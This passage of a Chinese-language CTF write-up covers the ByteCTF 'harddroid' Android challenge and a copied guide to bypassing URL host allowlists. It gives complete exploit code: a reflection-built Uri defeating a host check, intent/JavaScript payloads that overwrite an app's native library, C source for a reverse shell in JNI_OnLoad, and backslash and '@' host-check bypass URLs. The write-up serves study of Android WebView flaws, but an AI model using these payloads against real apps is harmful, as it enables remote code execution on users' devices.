SDK 接口 &#x3D; Android Framework 内部使用，但不对第三方 App 保证稳定性的接口</strong></p><p>括：</p><ul><li><code>android.net.Uri$HierarchicalUri</code></li><li><code>com.android.internal.*</code></li><li>大量隐藏类 &#x2F; 私有方法</li></ul><p>AndroidHiddenApiBypass 是在绕过什么？<strong>它绕过的是系统对反射&#x2F;JNI 访问隐藏 API 的拦截检查</strong></p><p>Android 9+ 的隐藏 API 限制，本质是：</p><ul><li>在 ART（Android Runtime）里</li><li>对反射&#x2F;JNI 调用加了一层<strong>黑白名单检查</strong></li><li>非 SDK 接口 → 拦截</li></ul><p>AndroidHiddenApiBypass 做的事情是：</p><ol><li><p>利用 <strong>已允许的 API</strong></p></li><li><p><strong>修改 ART 内部的隐藏 API 访问策略</strong></p></li><li><p>把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist / greylist</span><br></pre></td></tr></table></figure><p>改成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whitelist</span><br></pre></td></tr></table></figure></li><li><p>从此反射调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setAccessible(true)</span><br></pre></td></tr></table></figure><p>不再被拦截</p></li></ol><p><code>setAccessible(true)</code> 的作用是：临时关闭 Java 语言层面的“访问权限检查”，让你可以调用 <code>private / protected</code> 的字段、方法、构造函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c.setAccessible(true);</span><br><span class="line">c.newInstance();  </span><br></pre></td></tr></table></figure><p>这一步等于对 JVM 说：知道这是 private 的，不要再帮我做访问控制检查了</p><p>1️⃣ Java 语言层（<code>setAccessible(true)</code>）</p><ul><li>管的是：<ul><li>public &#x2F; private &#x2F; protected</li></ul></li><li>这是 <strong>Java 自己的规则</strong></li></ul><p>2️⃣ Android Runtime 层（Hidden API）</p><ul><li>管的是：你能不能碰 framework 的内部 API</li><li>这是 <strong>Android 额外加的一层规则</strong></li></ul></blockquote><p>如果将构造好的<code>uri</code>先toString，然后再Uri.parse就会输出下面的日志，对比上面的说明HierarchicalUri 构造的uri确实可以绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Scheme: http</span><br><span class="line">// UserInfo: app.toutiao.com</span><br><span class="line">// Host: xxx.xxx.xxx.xxx</span><br><span class="line">// Authority: app.toutiao.com@xxx.xxx.xxx.xxx</span><br><span class="line">// toString(): http://app.toutiao.com@xxx.xxx.xxx.xxx/harddroid.htm</span><br></pre></td></tr></table></figure><p>绕过之后可以让TestActivity的WebView加载远程的恶意html，而恶意html要设法利用js接口向被攻击APP数据目录写文件或修改已存在的文件，再进行漏洞利用。</p><ol><li><p>先是通过location.href 使webview添加js接口，要想添加接口必须使用app.toutiao.com作host，为后面调用接口方法做准备。</p></li><li><p>然后是js接口的利用，如果intent通过onNewIntent这个方法进入，则访问的还是上次onCreate实例化的添加js接口的webview，因此当构造javascript:xxxxx这样的url时候就会形成UXSS问题，因此第二次通过location.href 跳转实际是执行js接口方法，将&#x2F;data&#x2F;data&#x2F;com.bytectf.harddroid&#x2F;files&#x2F;libUtils.so 覆盖为恶意二进制so，恶意的so只含JNI_OnLoad ，在下次加载so时反弹shell。</p><blockquote><p>一般来说，当launchMode不是standard的时候，连续两个Intent唤起activity就只存在一个Activity实例，除了第一次启动，后续都走onNewIntent。但是在AndroidManifest.xml文件中，作者显式的将launchMode指定为standard了，很容易错误认为这里是没问题的。</p><p>但是在Intent中定义了很多FLAG，其中有几个FLAG也可以设定Activity的启动方式，如果Launch Mode和FLAG设定的Activity的启动方式有冲突，则以FLAG设定的为准。当我们给Intent设置Intent.FLAG_ACTIVITY_SINGLE_TOP后，他的启动模式将无视manifest的定义并变成singleTop。</p></blockquote></li><li><p>完成上述工作后就可以再次通过location.href 跳转，加载覆盖后的so，执行JNI_OnLoad 反弹Shell</p></li></ol><h2 id="APP构建"><a href="#APP构建" class="headerlink" title="APP构建"></a>APP构建</h2><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnharddroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> org.lsposed.hiddenapibypass.HiddenApiBypass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.harddroid&quot;</span>,<span class="string">&quot;com.bytectf.harddroid.MainActivity&quot;</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">jump_uri</span> <span class="operator">=</span> getUri(<span class="string">&quot;@xxx.xxx.xxx.xxx/harddroid.html&quot;</span>);</span><br><span class="line">        intent.setData(jump_uri);</span><br><span class="line">        Log.d(<span class="string">&quot;Test&quot;</span>,intent.toUri(Intent.URI_INTENT_SCHEME));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Uri <span class="title function_">getUri</span><span class="params">(String attackerUri)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;attackNewIntent&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">toutiaoUri</span> <span class="operator">=</span> <span class="string">&quot;app.toutiao.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 绕过API反射调用限制，具体使用参照项目说明</span></span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class="line">            HiddenApiBypass.addHiddenApiExemptions(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">partClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$Part&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">partConstructor</span> <span class="operator">=</span> partClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            partConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">pathPartClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$PathPart&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">pathPartConstructor</span> <span class="operator">=</span> pathPartClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            pathPartConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">hierarchicalUriClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$HierarchicalUri&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">hierarchicalUriConstructor</span> <span class="operator">=</span> hierarchicalUriClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            hierarchicalUriConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">authority</span> <span class="operator">=</span> partConstructor.newInstance(toutiaoUri, toutiaoUri);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">path</span> <span class="operator">=</span> pathPartConstructor.newInstance(attackerUri, attackerUri);</span><br><span class="line">            <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> (Uri) hierarchicalUriConstructor.newInstance(<span class="string">&quot;http&quot;</span>, authority, path, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Scheme: &quot;</span> + uri.getScheme());</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;UserInfo: &quot;</span> + uri.getUserInfo());</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Host: &quot;</span> + uri.getHost());</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Authority: &quot;</span> + uri.getAuthority());</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;toString(): &quot;</span> + uri.toString());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> uri;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>harddroid.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> location.<span class="property">href</span>=<span class="string">&quot;intent://app.toutiao.com/#Intent;package=com.bytectf.harddroid;scheme=http;component=com.bytectf.harddroid/.TestActivity;end&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> payload = <span class="title function_">btoa</span>(</span></span><br><span class="line"><span class="language-javascript">        <span class="string">`jsi.write_file(&quot;/data/data/com.bytectf.harddroid/files/libUtils.so&quot;,&quot;base64(pwnharddroid.so)&quot;)`</span></span></span><br><span class="line"><span class="language-javascript">    )</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123; location.<span class="property">href</span>=<span class="string">&quot;intent:eval(atob(&#x27;&quot;</span>+payload+<span class="string">&quot;&#x27;))#Intent;scheme=javascript;launchFlags=0x20000000;component=com.bytectf.harddroid/.TestActivity;end&quot;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123; location.<span class="property">href</span>=<span class="string">&quot;intent://app.toutiao.com/#Intent;package=com.bytectf.harddroid;scheme=http;component=com.bytectf.harddroid/.TestActivity;end&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,<span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们此时可以完整的梳理一下流程</p><p><strong>T0</strong>：从外部启动 HardDroid 的 MainActivity</p><p><strong>MainActivity 的这句加载服务器上的 HTML文件</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.loadUrl(data.toString());</span><br></pre></td></tr></table></figure><p><strong>T1</strong>：harddroid.html 在 MainActivity 的 WebView 里执行 JS</p><p>harddroid.html 里第一句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = &quot;intent://app.toutiao.com/#Intent; ... component=.../.TestActivity; end&quot;</span><br></pre></td></tr></table></figure><p>这一步<strong>不是普通网页跳转</strong>，而是触发 MainActivity 的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shouldOverrideUrlLoading(...)</span><br></pre></td></tr></table></figure><p>因为 url 的 scheme 是 <code>intent</code>，MainActivity 会：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startActivity(Intent.parseUri(url, 1));</span><br></pre></td></tr></table></figure><p>跳转到TestActivity</p><p><strong>T2</strong>：TestActivity 被启动后，立刻执行 onCreate → handle(getIntent())</p><p>TestActivity 代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onCreate(...) &#123;</span><br><span class="line">  ...</span><br><span class="line">  handle(getIntent());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 <code>getIntent()</code> <strong>就是刚才从 MainActivity startActivity 出来的那个 Intent</strong>，也就那条 intent:&#x2F;&#x2F;… component&#x3D;TestActivity … scheme&#x3D;http </p><p>满足 if：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme == http &amp;&amp; authority == app.toutiao.com</span><br></pre></td></tr></table></figure><p>因此：</p><ul><li><code>addJavascriptInterface(this, &quot;jsi&quot;)</code> ✅</li><li><code>loadUrl(&quot;http://app.toutiao.com/...&quot;)</code>（这次加载什么页面不重要，关键是接口已经加上了）</li></ul><p><strong>T3</strong>：1 秒后，harddroid.html 再触发第二个 Intent（javascript:）</p><p>harddroid.html 第二跳通常是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = &quot;intent:eval(atob(payload))#Intent;scheme=javascript;launchFlags=0x20000000;component=.../.TestActivity;end&quot;</span><br></pre></td></tr></table></figure><p>这又被 MainActivity 的 WebView 拦截，startActivity 一个 Intent。</p><p>这一次因为设置了 <code>FLAG_ACTIVITY_SINGLE_TOP</code>（0x20000000）：</p><ul><li>TestActivity <strong>不会重新 onCreate</strong></li><li>而是走：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onNewIntent(intent2) -&gt; handle(intent2)</span><br></pre></td></tr></table></figure><p><code>intent2.data</code> 是：<code>javascript:eval(...)</code></p><p>于是走 else：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">removeJavascriptInterface(&quot;jsi&quot;);</span><br></pre></td></tr></table></figure><p>但紧接着仍然执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.loadUrl(&quot;javascript:eval(...)&quot;);</span><br></pre></td></tr></table></figure><p>在同一个旧 WebView 上下文里执行 JS，**调用 jsi.write_file(…)**，把 <code>libUtils.so</code> 覆盖为 evil.so </p><blockquote><p>这里一定需要设置FLAG_ACTIVITY_SINGLE_TOP，否则重来一次会没有jsi</p></blockquote><p><strong>T4</strong>：再过 1 秒，第三跳回到<code>http://app.toutiao.com</code>触发加载 so</p><p>第三跳再打开一次：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent://app.toutiao.com/#Intent;scheme=http;component=.../.TestActivity;end</span><br></pre></td></tr></table></figure><p>又走 onNewIntent → handle(intent3)，满足 if：</p><ul><li>发现 <code>/data/data/.../files/libUtils.so</code> 存在</li><li><code>System.load(this.soPath);</code> </li><li>触发 evil.so 的 <code>JNI_OnLoad</code></li></ul><p>SO源码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;jni.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TAG <span class="string">&quot;hackso&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGD(...) __android_log_print(ANDROID_LOG_DEBUG,TAG ,__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint <span class="title function_">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="type">void</span>* reserved)</span> &#123;</span><br><span class="line">    LOGD(<span class="string">&quot;JNI_OnLoading...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> rsSocket;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">socketAddr</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// configure socket address</span></span><br><span class="line">        socketAddr.sin_family = AF_INET;</span><br><span class="line">        socketAddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;xxx.xxx.xxx.xxx&quot;</span>);</span><br><span class="line">        socketAddr.sin_port = htons(xxx);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// create socket connection</span></span><br><span class="line">        rsSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">        connect(rsSocket, (<span class="keyword">struct</span> sockaddr *) &amp;socketAddr, <span class="keyword">sizeof</span>(socketAddr));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// redirect std to socket</span></span><br><span class="line">        dup2(rsSocket, <span class="number">0</span>); <span class="comment">// stdin</span></span><br><span class="line">        dup2(rsSocket, <span class="number">1</span>); <span class="comment">// stdout</span></span><br><span class="line">        dup2(rsSocket, <span class="number">2</span>); <span class="comment">// stderr</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// get shell</span></span><br><span class="line">        execve(<span class="string">&quot;/system/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        LOGD(<span class="string">&quot;shelling...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意的是原来LLeaves博客上的harddroid.html的那份写so部分不太方便</p><p>其实可以改成从服务器直接路径里读也行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="variable constant_">BASE</span> = <span class="string">&quot;http://1xxxx&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="variable constant_">TARGET</span> = <span class="string">&quot;/data/data/com.bytectf.harddroid/files/libUtils.so&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">jump</span>(<span class="params">u</span>)&#123; location.<span class="property">href</span> = u; &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">run</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">jump</span>(<span class="string">&quot;intent://app.toutiao.com/#Intent;package=com.bytectf.harddroid;scheme=http;component=com.bytectf.harddroid/.TestActivity;end&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(<span class="title function_">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> b64 = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="variable constant_">BASE</span> + <span class="string">&quot;/libpwnharddroid.b64&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">text</span>());</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> js = <span class="string">`jsi.write_file(&quot;<span class="subst">$&#123;TARGET&#125;</span>&quot;,&quot;<span class="subst">$&#123;b64&#125;</span>&quot;)`</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> payload = <span class="title function_">btoa</span>(js);</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">jump</span>(<span class="string">`intent:eval(atob(&#x27;<span class="subst">$&#123;payload&#125;</span>&#x27;))#Intent;scheme=javascript;launchFlags=0x20000000;component=com.bytectf.harddroid/.TestActivity;end`</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">jump</span>(<span class="string">&quot;intent://app.toutiao.com/#Intent;package=com.bytectf.harddroid;scheme=http;component=com.bytectf.harddroid/.TestActivity;end&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">run</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260125224953924.png" alt="image-20260125224953924"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260125225022762.png" alt="image-20260125225022762"></p><h2 id="绕过Android域名白名单校验的方法"><a href="#绕过Android域名白名单校验的方法" class="headerlink" title="绕过Android域名白名单校验的方法"></a>绕过Android域名白名单校验的方法</h2><p>copy from <a href="https://blog.csdn.net/tabactivity/article/details/129197015">绕过Android域名白名单校验的方法_url白名单endswith绕过-CSDN博客</a></p><h3 id="一、-Url加入反斜杠"><a href="#一、-Url加入反斜杠" class="headerlink" title="一、 Url加入反斜杠&quot;\&quot;"></a>一、 Url加入反斜杠<code>&quot;\&quot;</code></h3><p>mediumdroid的一种解法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  Uri 结构</span></span><br><span class="line"><span class="comment">*   [scheme:][//authority][path][?query][#fragment]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">[check_v1]</span><br><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(attackerControlledString);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;legitimate.com&quot;</span>.equals(uri.getHost()) || uri.getHost().endsWith(<span class="string">&quot;.legitimate.com&quot;</span>)) &#123;</span><br><span class="line">    webView.loadUrl(attackerControlledString, getAuthorizationHeaders());</span><br><span class="line">    <span class="comment">// or webView.loadUrl(uri.toString()) </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://attacker.com\\.legitimate.com/smth&quot;</span>; </span><br><span class="line">Log.d(<span class="string">&quot;getHost:&quot;</span>, Uri.parse(url).getHost());         <span class="comment">// 输出 attacker.com\.legitimate.com ! </span></span><br><span class="line"><span class="keyword">if</span> (Uri.parse(url).getHost().endsWith(<span class="string">&quot;.legitimate.com&quot;</span>)) &#123; </span><br><span class="line">        webView.loadUrl(url, getAuthorizationHeaders());  <span class="comment">// 成功加载 attacker.com！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 getHost() 和 loadUrl() 的表现不一致，if检验跳转目标是.legitimate.com，但执行时浏览器会把反斜线纠正为正斜线去访问attacker.com。那么如果是用 equals() 来做完整的 host 检验该怎么办呢？只需加一个‘@’就能隔断非法前缀。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://attacker.com\\@legitimate.com/smth&quot;</span>;</span><br><span class="line">Log.d(<span class="string">&quot;Wow&quot;</span>, 